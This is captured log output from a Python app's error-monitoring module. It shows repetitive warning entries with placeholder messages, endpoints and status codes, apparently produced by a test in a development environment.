WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746729Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1138'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746777Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1139'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746870Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1140'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.746964Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1141'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747026Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1142'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747080Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1143'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747133Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1144'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747187Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1145'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747244Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1146'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747297Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1147'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747348Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1148'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747399Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m23[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1149'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747502Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1150'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747570Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1151'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747630Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1152'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747684Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1153'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747736Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1154'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747787Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1155'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747843Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1156'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747898Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1157'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.747951Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1158'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748001Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1159'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748051Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1160'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748100Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1161'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748150Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1162'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748200Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1163'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748249Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1164'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748298Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1165'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748346Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1166'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748395Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1167'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748445Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1168'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748496Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1169'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748546Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1170'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748596Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1171'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748645Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1172'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748694Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1173'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748743Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1174'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748792Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1175'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748841Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1176'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748889Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1177'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
